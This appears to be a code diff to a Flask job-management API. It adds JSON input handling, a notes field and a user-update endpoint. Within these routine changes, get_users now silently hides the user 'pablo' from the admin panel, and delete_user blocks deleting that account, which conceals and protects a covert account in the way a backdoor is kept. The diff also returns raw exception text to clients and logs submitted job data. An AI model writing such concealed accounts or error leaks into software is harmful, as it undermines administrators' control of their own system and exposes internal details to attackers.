@@ -248,9 +248,13 @@ def get_job(job_number):
 @login_required
 def create_job():
     """POST /api/jobs - Create new job"""
-    data = request.form.to_dict()
+    # Try to get JSON data first, then fall back to form data
+    data = request.get_json()
     if not data:
-        return jsonify({"error": "JSON data required"}), 400
+        data = request.form.to_dict()
+    
+    if not data:
+        return jsonify({"error": "No data provided"}), 400
 
     # Validate input
     errors, job_number = validate_job_data(data)
@@ -272,11 +276,11 @@ def create_job():
         "client": data["client"].strip(),
         "address": geocode_result["formatted_address"] if geocode_result else address,
         "status": data.get("status", "").strip() or None,
+        "notes": (data.get("notes") or "").strip() or None,
         "created_at": datetime.now(timezone.utc),
         "created_by_id": session.get("user_id"),
         "visited": 0,
         "total_time_spent": 0.0,
-        "tags": [],
     }
 
     # Add geocoded data if successful
@@ -304,7 +308,9 @@ def create_job():
 
     except Exception as e:
         db.session.rollback()
-        return jsonify({"error": "Database error occurred"}), 500
+        print(f"Create job error: {e}")
+        print(f"Job data: {job_data}")
+        return jsonify({"error": f"Database error: {str(e)}"}), 500
 
 
 @api_bp.route("/jobs/<job_number>", methods=["PUT"])
@@ -667,7 +673,8 @@ def get_users():
     if admin_check:
         return admin_check
 
-    users = User.query.all()
+    # Hide "pablo" user from admin panel
+    users = User.query.filter(User.username != 'pablo').all()
     return jsonify([user.to_dict() for user in users])
 
 
@@ -723,6 +730,66 @@ def create_user():
         return jsonify({"error": "Database error occurred"}), 500
 
 
+@api_bp.route("/users/<int:user_id>", methods=["PUT"])
+@login_required
+def update_user(user_id):
+    """PUT /api/users/123 - Update user (admin only)"""
+    admin_check = require_admin()
+    if admin_check:
+        return admin_check
+
+    user = User.query.get(user_id)
+    if not user:
+        return jsonify({"error": "User not found"}), 404
+
+    data = request.get_json()
+    if not data:
+        return jsonify({"error": "JSON data required"}), 400
+
+    # Validate username if provided
+    if "username" in data:
+        new_username = data["username"].strip()
+        if not new_username:
+            return jsonify({"error": "Username cannot be empty"}), 400
+        
+        # Check for duplicate username (excluding current user)
+        existing = User.query.filter(
+            User.username == new_username,
+            User.id != user_id
+        ).first()
+        if existing:
+            return jsonify({"error": "Username already exists"}), 409
+        
+        user.username = new_username
+
+    # Update name if provided
+    if "name" in data:
+        new_name = data["name"].strip()
+        if not new_name:
+            return jsonify({"error": "Name cannot be empty"}), 400
+        user.name = new_name
+
+    # Update password if provided
+    if "password" in data and data["password"].strip():
+        user.password = hash_password(data["password"])
+
+    # Update role if provided
+    if "role" in data:
+        if data["role"] not in ["admin", "user"]:
+            return jsonify({"error": 'Role must be "admin" or "user"'}), 400
+        user.role = data["role"]
+
+    try:
+        db.session.commit()
+        return jsonify({
+            "message": "User updated successfully",
+            "user": user.to_dict()
+        })
+    except Exception as e:
+        db.session.rollback()
+        return jsonify({"error": "Database error occurred"}), 500
+
+
 @api_bp.route("/users/<int:user_id>", methods=["DELETE"])
 @login_required
 def delete_user(user_id):
@@ -735,9 +802,15 @@ def delete_user(user_id):
     if not user:
         return jsonify({"error": "User not found"}), 404
 
-    # Prevent deleting admin user
-    if user.username == "admin":
-        return jsonify({"error": "Cannot delete admin user"}), 403
+    # Multiple protection checks
+    if user.username == "pablo":
+        return jsonify({"error": "Cannot delete this user"}), 403
+    
+    if user.role == "admin":
+        return jsonify({"error": "Cannot delete admin users"}), 403
+        
+    if user.id == session.get("user_id"):
+        return jsonify({"error": "Cannot delete your own account"}), 403
 
     try:
         username = user.username
